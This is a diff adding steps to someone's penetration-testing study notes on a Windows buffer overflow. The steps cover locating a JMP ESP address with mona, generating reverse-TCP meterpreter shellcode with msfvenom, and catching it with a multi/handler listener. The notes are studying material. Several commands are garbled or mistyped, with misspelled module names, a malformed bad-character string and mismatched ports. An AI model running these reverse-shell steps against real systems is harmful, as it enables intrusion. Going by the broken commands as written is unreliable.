@@ -163,7 +163,21 @@
     JMPESP locations
       !mona modules - find the one with all falses
       !mona jmp -r esp -m "essfunc.dll" --change
-      window to (Win)
-    
+      window to (Winows - log data)
+    copy first address of jmp esp
+
+    msfvenom -p windows/meterpreeter/reverse_tcp
+    lhost=<linops> lport=4000 -b
+    "\x00\xfe\x20\x0x\0xff" -f python - get shellcode add to script minix first line
+
+    open msfvenom
+    use muli/handler
+    LPORT = 4444
+    set payload windows/meterpreter/reverse_tcp
+    exploit 
+                        LIVING OFF THE LAND
+================================================================================
+1)  Static
+  
 
       
